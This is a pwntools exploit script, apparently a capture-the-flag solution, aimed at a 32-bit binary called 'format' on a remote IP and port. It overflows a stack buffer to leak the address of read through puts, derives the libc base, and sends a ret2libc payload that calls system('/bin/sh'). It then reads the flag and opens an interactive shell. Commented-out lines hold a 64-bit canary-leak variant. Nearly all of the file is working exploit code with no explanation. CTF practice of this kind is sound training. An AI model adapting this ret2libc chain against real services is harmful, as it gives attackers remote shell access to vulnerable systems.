
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='i386', log_level='debug')
# sh = process('./ret2libc164')
elf = ELF('./format')

readgot=elf.got['read']
putsplt=elf.plt['puts']
# main_addr = elf.symbols['main']
main_addr =0x0000000000400908
rdi = 0x0000000000400a93
io = remote("111.200.241.244",60484)
# io = process("./format")
# gdb.attach(io)
# io.recv()
# io.sendlineafter('--------\n>> ', '1')
payload = 0x88 * 'A' + 0x4 * 'B' + p32(putsplt) + p32(0x08048888) + p32(readgot)
io.recvuntil('\n\n')
io.sendline(payload)
read_addr = u32(io.recv(4))
# info = io.recvline()
# log.info("info => %s", info)
#
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
print('read_addr :',hex(read_addr))
# libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
libc = ELF('./libc_32.so.6')
# libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.symbols['read']
print('libc_base:',libc_base)
system_addr = libc_base + libc.symbols['system']

binsh_addr =  libc_base + 0x0015902b
log.info("system_addr => %#x", system_addr)
log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
payload = 'a' * 0x88 + p32(0) + p32(system_addr) + p32(0) + p32(binsh_addr)
io.sendline(payload)
io.sendline(b'cat flag\n')
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
